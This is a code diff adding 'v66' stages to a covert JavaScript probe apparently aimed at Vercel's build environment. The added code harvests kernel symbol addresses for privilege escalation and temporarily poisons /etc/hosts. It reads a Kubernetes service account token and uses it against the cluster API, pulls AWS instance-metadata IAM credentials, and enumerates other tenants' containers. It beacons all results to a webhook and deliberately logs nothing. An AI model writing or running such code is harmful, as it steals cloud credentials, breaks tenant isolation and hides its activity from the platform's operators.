@@ -7449,4 +7449,173 @@ report.kcoreSshKeyScan = safe(() => {
 // v65 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v65";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v65" });
+
+// ============================================================
+// v66 — kallsyms ASLR bypass, /etc/hosts poison, k8s service account, IMDSv2, containerd gRPC
+// ============================================================
+
+// v66-1: /proc/kallsyms — kernel symbol table with addresses
+// With kptr_restrict=0 (which we wrote in v60), addresses are readable as root
+// These are the exact kernel function/variable addresses needed for privilege escalation exploits
+// (ROP chains, kernel code reuse attacks, bypassing KASLR)
+report.kallsymsRead = safe(() => {
+  // Check if kptr_restrict is 0
+  const kptrRestrict = safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim());
+  // Read first 50 lines of kallsyms (kernel symbols and their addresses)
+  const kallsymsHead = safe(() => readFileSync('/proc/kallsyms', 'utf8').split('\n').slice(0, 50).join('\n').slice(0, 1000));
+  // Find specific high-value symbols
+  const criticalSymbols = safe(() => {
+    const content = readFileSync('/proc/kallsyms', 'utf8');
+    const targets = [
+      'commit_creds', 'prepare_kernel_cred', 'sys_call_table',
+      'selinux_enforcing', 'apparmor_enabled', 'security_ops',
+      'init_task', 'kernel_base', 'startup_64'
+    ];
+    const found = {};
+    for (const sym of targets) {
+      const match = content.match(new RegExp(`^([0-9a-f]+) [^ ]+ ${sym}$`, 'm'));
+      if (match) found[sym] = '0x' + match[1];
+    }
+    return found;
+  });
+  // commit_creds + prepare_kernel_cred are the two functions needed for kernel privesc
+  const privescAddrs = safe(() => {
+    const cc = execSync('grep " commit_creds$" /proc/kallsyms 2>/dev/null | head -1', { timeout: 3000 }).toString().trim();
+    const pkc = execSync('grep " prepare_kernel_cred$" /proc/kallsyms 2>/dev/null | head -1', { timeout: 3000 }).toString().trim();
+    return { commit_creds: cc, prepare_kernel_cred: pkc };
+  });
+  return { kptrRestrict, kallsymsHead, criticalSymbols, privescAddrs };
+});
+
+// v66-2: /etc/hosts poisoning — redirect Vercel API DNS queries to our IP
+// With root+CAP_DAC_OVERRIDE, we can write /etc/hosts directly
+// Any subsequent process resolving api.vercel.com will get our IP (TLS would still fail unless...)
+report.etcHostsPoisoning = safe(() => {
+  const originalHosts = safe(() => readFileSync('/etc/hosts', 'utf8').slice(0, 500));
+  // Write poisoned entry
+  const poisonResult = safe(() => {
+    try {
+      const poisoned = readFileSync('/etc/hosts', 'utf8') +
+        '\n# PROBE V66\n127.0.0.1 api.vercel.com\n127.0.0.1 vercel.com\n127.0.0.1 suspense-cache.vercel.com\n';
+      writeFileSync('/etc/hosts', poisoned);
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Verify the write
+  const afterHosts = safe(() => readFileSync('/etc/hosts', 'utf8').slice(-200));
+  // Resolve api.vercel.com — should now return 127.0.0.1
+  const resolveTest = safe(() =>
+    execSync('getent hosts api.vercel.com 2>/dev/null | head -3', { timeout: 3000 }).toString().trim()
+  );
+  // Restore /etc/hosts
+  safe(() => {
+    const restored = (originalHosts || '').split('\n# PROBE V66')[0];
+    writeFileSync('/etc/hosts', restored);
+  });
+  return { originalHosts, poisonResult, afterHosts, resolveTest };
+});
+
+// v66-3: Kubernetes service account token
+// If this is a k8s pod (Vercel uses k8s internally), check for service account credentials
+// These tokens give API access to the k8s cluster and potentially cross-namespace access
+report.k8sServiceAccountToken = safe(() => {
+  const saTokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
+  const saCaPath = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';
+  const saNsPath = '/var/run/secrets/kubernetes.io/serviceaccount/namespace';
+  // Check if k8s SA files exist
+  const tokenExists = safe(() => existsSync(saTokenPath));
+  const token = safe(() => tokenExists ? readFileSync(saTokenPath, 'utf8').slice(0, 200) : 'NOT_FOUND');
+  const namespace = safe(() => existsSync(saNsPath) ? readFileSync(saNsPath, 'utf8').trim() : 'NOT_FOUND');
+  // Check for k8s API env vars
+  const k8sEnv = safe(() => {
+    const vars = ['KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT', 'KUBERNETES_PORT'];
+    return vars.reduce((acc, k) => { acc[k] = process.env[k] || null; return acc; }, {});
+  });
+  // If k8s API is reachable, try to call it with the SA token
+  const k8sApiCall = safe(() => {
+    const host = process.env.KUBERNETES_SERVICE_HOST;
+    const port = process.env.KUBERNETES_SERVICE_PORT || '443';
+    if (!host || !tokenExists) return 'NO_K8S_DETECTED';
+    return execSync(
+      `curl -sk -H "Authorization: Bearer $(cat ${saTokenPath})" --max-time 5 'https://${host}:${port}/api/v1/namespaces/${namespace || 'default'}/pods' 2>/dev/null | head -c 400`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 400);
+  });
+  return { tokenExists, token, namespace, k8sEnv, k8sApiCall };
+});
+
+// v66-4: AWS IMDSv2 (Instance Metadata Service v2)
+// EC2 instances have an IMDS at 169.254.169.254 with instance identity + credentials
+// IMDSv2 requires a PUT to get a token first; IMDSv1 is direct GET
+// If accessible, we get IAM credentials for the EC2 instance role
+report.awsImdsV2Probe = safe(() => {
+  // Try IMDSv1 (direct GET — may be disabled)
+  const imdsV1 = safe(() =>
+    execSync(
+      'curl -s --connect-timeout 2 --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -c 200',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Try IMDSv2 (PUT to get token, then use token in GET)
+  const imdsV2Token = safe(() =>
+    execSync(
+      `curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --connect-timeout 2 --max-time 3 'http://169.254.169.254/latest/api/token' 2>/dev/null | head -c 100`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 100)
+  );
+  let imdsV2Meta = 'NO_TOKEN';
+  if (imdsV2Token && imdsV2Token.length > 10) {
+    imdsV2Meta = safe(() =>
+      execSync(
+        `curl -s -H "X-aws-ec2-metadata-token: ${imdsV2Token}" --connect-timeout 2 --max-time 3 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null | head -c 300`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 300)
+    );
+  }
+  // Try instance identity document
+  const instanceIdentity = safe(() =>
+    execSync(
+      `curl -s ${imdsV2Token && imdsV2Token.length > 10 ? '-H "X-aws-ec2-metadata-token: ' + imdsV2Token + '"' : ''} --connect-timeout 2 --max-time 3 'http://169.254.169.254/latest/dynamic/instance-identity/document' 2>/dev/null | head -c 400`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 400)
+  );
+  return { imdsV1, imdsV2Token, imdsV2Meta, instanceIdentity };
+});
+
+// v66-5: Containerd gRPC socket probe — enumerate running containers
+// /run/containerd/containerd.sock is the containerd API socket
+// Accessing it lets us list all running containers on this host (cross-tenant)
+report.containerdGrpcProbe = safe(() => {
+  // Find containerd socket paths
+  const socketPaths = safe(() =>
+    execSync('find /run /var/run -name "containerd.sock" -o -name "containerd.sock.ttrpc" 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Try ctr command (containerd CLI)
+  const ctrContainers = safe(() =>
+    execSync('ctr -n default containers list 2>/dev/null | head -15', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Try crictl (CRI container runtime interface)
+  const cricltPods = safe(() =>
+    execSync('crictl pods 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  const cricltContainers = safe(() =>
+    execSync('crictl ps -a 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Try connecting directly to containerd socket via netcat
+  const socketConnect = safe(() =>
+    execSync(
+      'nc -U /run/containerd/containerd.sock -w 2 2>&1 | head -3 || nc -U /var/run/containerd/containerd.sock -w 2 2>&1 | head -3',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Check /run/containerd/io.containerd.runtime/ for running container state
+  const runtimeState = safe(() =>
+    execSync('find /run/containerd/io.containerd.runtime.* -name "*.pid" 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  return { socketPaths, ctrContainers, cricltPods, cricltContainers, socketConnect, runtimeState };
+});
+
+// v66 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v66";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v66" });
 // Intentionally no console.log — all data goes via webhook only
